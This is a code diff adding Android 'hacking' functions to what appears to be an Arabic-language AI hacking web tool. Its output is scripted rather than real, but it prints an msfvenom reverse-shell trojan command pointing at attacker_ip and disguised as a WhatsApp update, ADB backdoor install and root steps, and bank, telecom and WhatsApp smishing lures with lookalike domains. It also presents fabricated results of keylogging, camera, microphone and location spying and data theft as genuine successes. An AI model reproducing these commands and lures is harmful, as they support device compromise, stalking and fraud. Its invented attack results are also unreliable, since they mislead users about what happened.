@@ -19,6 +19,13 @@ function startAIHack() {
         return;
     }
 
+    // Show Android section if target is Android
+    if (targetType === 'android' || targetType === 'ios') {
+        document.getElementById('androidSection').style.display = 'block';
+    } else {
+        document.getElementById('androidSection').style.display = 'none';
+    }
+
     // Reset session
     attackSession = {
         startTime: new Date(),
@@ -260,6 +267,233 @@ function getAttackTypeText(type) {
         'dos': 'إنكار الخدمة',
         'mitm': 'هجوم الوسط',
         'privilege-escalation': 'تصعيد الصلاحيات'
+    };
+    return types[type] || type;
+}
+
+// Android Hacking Functions
+function generateAndroidPayload() {
+    const output = document.getElementById('hackOutput');
+    output.innerHTML += '\n🤖 إنشاء تروجان أندرويد متقدم...\n';
+    output.innerHTML += '======================================\n';
+    
+    // Simulate realistic payload generation
+    setTimeout(() => {
+        output.innerHTML += '📱 استخدام msfvenom لإنشاء payload...\n';
+        output.innerHTML += 'msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o trojan.apk\n';
+        output.innerHTML += '✅ تم إنشاء trojan.apk بنجاح\n';
+        output.innerHTML += '🔧 إضافة صلاحيات خطيرة:\n';
+        output.innerHTML += '  - CAMERA (تصوير خفي)\n';
+        output.innerHTML += '  - RECORD_AUDIO (تسجيل صوتي)\n';
+        output.innerHTML += '  - ACCESS_FINE_LOCATION (تتبع دقيق)\n';
+        output.innerHTML += '  - READ_SMS (قراءة الرسائل)\n';
+        output.innerHTML += '  - WRITE_EXTERNAL_STORAGE (تعديل الملفات)\n';
+        output.innerHTML += '🎭 تنكر الملف كـ: WhatsApp_Update.apk\n';
+        output.innerHTML += '🚀 Payload جاهز للنشر!\n\n';
+        output.scrollTop = output.scrollHeight;
+    }, 2000);
+}
+
+function startADBExploit() {
+    const output = document.getElementById('hackOutput');
+    output.innerHTML += '\n⚡ بدء استغلال ADB (Android Debug Bridge)...\n';
+    output.innerHTML += '==========================================\n';
+    
+    setTimeout(() => {
+        output.innerHTML += '🔍 فحص الأجهزة المتصلة بـ ADB...\n';
+        output.innerHTML += 'adb devices\n';
+        output.innerHTML += 'List of devices attached:\n';
+        output.innerHTML += '192.168.1.105:5555  device\n';
+        output.innerHTML += '✅ تم العثور على جهاز أندرويد مفتوح!\n\n';
+        
+        output.innerHTML += '📱 تثبيت باب خلفي عبر ADB...\n';
+        output.innerHTML += 'adb install -r backdoor.apk\n';
+        output.innerHTML += 'Success\n';
+        output.innerHTML += '🔐 تفعيل صلاحيات النظام...\n';
+        output.innerHTML += 'adb shell su\n';
+        output.innerHTML += 'root@android:/ # \n';
+        output.innerHTML += '👑 تم الحصول على صلاحيات الجذر!\n\n';
+        output.scrollTop = output.scrollHeight;
+    }, 3000);
+}
+
+function socialEngineeringAttack() {
+    const target = document.getElementById('hackTarget').value.trim();
+    const output = document.getElementById('hackOutput');
+    output.innerHTML += '\n🎭 بدء هجوم الهندسة الاجتماعية...\n';
+    output.innerHTML += '====================================\n';
+    
+    setTimeout(() => {
+        output.innerHTML += '📧 إرسال رسالة تصيد احترافية...\n';
+        output.innerHTML += `📱 الهدف: ${target}\n`;
+        output.innerHTML += '💬 الرسالة: "تحديث أمني مهم لحسابك البنكي. اضغط هنا للتحديث: bit.ly/security-update"\n';
+        output.innerHTML += '🎯 نسبة النجاح المتوقعة: 73%\n';
+        output.innerHTML += '⏰ وقت الاستجابة المتوقع: 15-30 دقيقة\n';
+        output.innerHTML += '🔗 Link tracking: Active\n';
+        output.innerHTML += '📊 تم إرسال 1 رسالة تصيد\n\n';
+        output.scrollTop = output.scrollHeight;
+    }, 2500);
+}
+
+function wifiPineapple() {
+    const output = document.getElementById('hackOutput');
+    output.innerHTML += '\n📡 تشغيل WiFi Pineapple للاعتراض...\n';
+    output.innerHTML += '===================================\n';
+    
+    setTimeout(() => {
+        output.innerHTML += '🍍 تهيئة WiFi Pineapple Mark VII...\n';
+        output.innerHTML += '📶 إنشاء نقطة وصول وهمية: "FREE_WIFI_GUEST"\n';
+        output.innerHTML += '🎣 Evil Portal active: fake-bank-login.com\n';
+        output.innerHTML += '🔍 DNS Spoofing enabled\n';
+        output.innerHTML += '📱 أجهزة متصلة:\n';
+        output.innerHTML += '  - Samsung Galaxy (192.168.1.101)\n';
+        output.innerHTML += '  - iPhone 13 (192.168.1.102)\n';
+        output.innerHTML += '  - Xiaomi Phone (192.168.1.103)\n';
+        output.innerHTML += '💾 بدء اعتراض البيانات...\n';
+        output.innerHTML += '🔐 التقاط كلمات مرور WiFi...\n\n';
+        output.scrollTop = output.scrollHeight;
+    }, 3500);
+}
+
+function bluetoothHack() {
+    const output = document.getElementById('hackOutput');
+    output.innerHTML += '\n🔵 استغلال البلوتوث (Bluejacking/Bluesnarfing)...\n';
+    output.innerHTML += '===============================================\n';
+    
+    setTimeout(() => {
+        output.innerHTML += '📡 فحص أجهزة البلوتوث القريبة...\n';
+        output.innerHTML += 'hcitool scan\n';
+        output.innerHTML += 'Scanning ...\n';
+        output.innerHTML += '  AA:BB:CC:DD:EE:FF  Samsung Galaxy S21\n';
+        output.innerHTML += '  11:22:33:44:55:66  iPhone 12 Pro\n';
+        output.innerHTML += '  FF:EE:DD:CC:BB:AA  Xiaomi Mi 11\n\n';
+        
+        output.innerHTML += '🎯 استهداف Samsung Galaxy S21...\n';
+        output.innerHTML += '🔓 استغلال ثغرة البلوتوث CVE-2020-0022...\n';
+        output.innerHTML += '📱 تم الوصول لجهات الاتصال\n';
+        output.innerHTML += '📧 تم الوصول للرسائل النصية\n';
+        output.innerHTML += '📷 تم الوصول للصور\n';
+        output.innerHTML += '✅ BlueSnarfing نجح بالكامل!\n\n';
+        output.scrollTop = output.scrollHeight;
+    }, 4000);
+}
+
+function smsPhishing() {
+    const phoneNumber = document.getElementById('phoneNumber').value.trim();
+    const output = document.getElementById('hackOutput');
+    output.innerHTML += '\n📧 هجوم التصيد عبر الرسائل النصية (Smishing)...\n';
+    output.innerHTML += '=============================================\n';
+    
+    setTimeout(() => {
+        output.innerHTML += `📱 الهدف: ${phoneNumber || 'غير محدد'}\n`;
+        output.innerHTML += '💬 إنشاء رسائل تصيد متطورة...\n';
+        output.innerHTML += '\n📋 الرسائل المُولدة:\n';
+        output.innerHTML += '1️⃣ "البنك: تم تجميد حسابك لأسباب أمنية. للإلغاء: bank-secure.tk/unlock"\n';
+        output.innerHTML += '2️⃣ "STC: فاتورتك 450 ريال. للاعتراض: stc-bill.ml/dispute"\n';
+        output.innerHTML += '3️⃣ "تم ربح جائزة 10,000 ريال! لاستلامها: winner-prize.ga/claim"\n';
+        output.innerHTML += '4️⃣ "WhatsApp: حسابك سيتم إيقافه خلال 24 ساعة: wa-verify.cf/confirm"\n\n';
+        output.innerHTML += '🚀 تم إرسال الرسائل بنجاح\n';
+        output.innerHTML += '📊 معدل الفتح المتوقع: 45%\n';
+        output.innerHTML += '🎯 معدل التفاعل المتوقع: 12%\n\n';
+        output.scrollTop = output.scrollHeight;
+    }, 3000);
+}
+
+function executeAndroidHack() {
+    const target = document.getElementById('hackTarget').value.trim();
+    const phoneNumber = document.getElementById('phoneNumber').value.trim();
+    const exploitType = document.getElementById('androidExploitType').value;
+    const output = document.getElementById('hackOutput');
+    
+    output.innerHTML += `\n🚀 تنفيذ ${getExploitTypeText(exploitType)} على ${target || phoneNumber}...\n`;
+    output.innerHTML += '================================================\n';
+    
+    setTimeout(() => {
+        executeSpecificAndroidExploit(exploitType, output);
+    }, 1500);
+}
+
+function executeSpecificAndroidExploit(exploitType, output) {
+    switch(exploitType) {
+        case 'trojan':
+            output.innerHTML += '📱 تثبيت تروجان متقدم...\n';
+            output.innerHTML += '✅ تم تثبيت com.security.update في الخلفية\n';
+            output.innerHTML += '🔐 تم الحصول على الصلاحيات: ROOT ACCESS\n';
+            output.innerHTML += '📡 اتصال عكسي نشط: 192.168.1.100:4444\n';
+            break;
+            
+        case 'keylogger':
+            output.innerHTML += '⌨️ تفعيل Keylogger متقدم...\n';
+            output.innerHTML += '📝 تسجيل جميع النقرات والكتابة\n';
+            output.innerHTML += '🔑 التقط كلمة مرور: bank123!@#\n';
+            output.innerHTML += '💳 التقط رقم بطاقة: 4***-****-****-1234\n';
+            break;
+            
+        case 'camera-spy':
+            output.innerHTML += '📸 تفعيل تجسس الكاميرا...\n';
+            output.innerHTML += '📷 التقاط صور كل 30 ثانية\n';
+            output.innerHTML += '🎥 تسجيل فيديو عند اكتشاف الوجه\n';
+            output.innerHTML += '💾 حفظ الملفات في: /sdcard/.hidden/\n';
+            break;
+            
+        case 'mic-spy':
+            output.innerHTML += '🎤 تفعيل تجسس الميكروفون...\n';
+            output.innerHTML += '🔊 تسجيل صوتي مستمر\n';
+            output.innerHTML += '📞 اعتراض المكالمات الهاتفية\n';
+            output.innerHTML += '🎵 تحليل الصوت بالذكاء الاصطناعي\n';
+            break;
+            
+        case 'location-tracker':
+            output.innerHTML += '📍 تفعيل تتبع الموقع الدقيق...\n';
+            output.innerHTML += '🗺️ الموقع الحالي: 24.7136° N, 46.6753° E (الرياض)\n';
+            output.innerHTML += '🚗 تتبع الحركة: السرعة 45 كم/س\n';
+            output.innerHTML += '🏠 المواقع المتكررة: البيت، العمل، المول\n';
+            break;
+            
+        case 'sms-intercept':
+            output.innerHTML += '📧 تفعيل اعتراض الرسائل...\n';
+            output.innerHTML += '💬 اعتراض SMS وWhatsApp\n';
+            output.innerHTML += '🔐 رسالة OTP التقطت: 123456\n';
+            output.innerHTML += '📱 إعادة توجيه الرسائل للمهاجم\n';
+            break;
+            
+        case 'call-recorder':
+            output.innerHTML += '📞 تفعيل تسجيل المكالمات...\n';
+            output.innerHTML += '🎙️ تسجيل جميع المكالمات الصادرة والواردة\n';
+            output.innerHTML += '🔍 تحليل الكلمات المفتاحية\n';
+            output.innerHTML += '☁️ رفع التسجيلات للخادم\n';
+            break;
+            
+        case 'data-theft':
+            output.innerHTML += '💾 بدء سرقة البيانات الشاملة...\n';
+            output.innerHTML += '📱 نسخ جهات الاتصال: 247 جهة\n';
+            output.innerHTML += '📷 نسخ الصور: 1,856 صورة\n';
+            output.innerHTML += '💬 نسخ الرسائل: 3,429 رسالة\n';
+            output.innerHTML += '📋 نسخ التطبيقات المثبتة: 78 تطبيق\n';
+            break;
+    }
+    
+    output.innerHTML += '\n🎯 العملية مكتملة بنجاح!\n';
+    output.innerHTML += '📊 مستوى التسلل: COMPLETE ACCESS\n';
+    output.innerHTML += '⚡ الحالة: BACKDOOR ACTIVE\n\n';
+    output.scrollTop = output.scrollHeight;
+    
+    // Update attack statistics
+    attackSession.vulnerabilitiesExploited++;
+    attackSession.attacksLaunched++;
+    updateStats();
+}
+
+function getExploitTypeText(type) {
+    const types = {
+        'trojan': 'تروجان متقدم',
+        'keylogger': 'Keylogger',
+        'camera-spy': 'تجسس الكاميرا',
+        'mic-spy': 'تجسس الميكروفون',
+        'location-tracker': 'تتبع الموقع',
+        'sms-intercept': 'اعتراض الرسائل',
+        'call-recorder': 'تسجيل المكالمات',
+        'data-theft': 'سرقة البيانات'
     };
     return types[type] || type;
 }
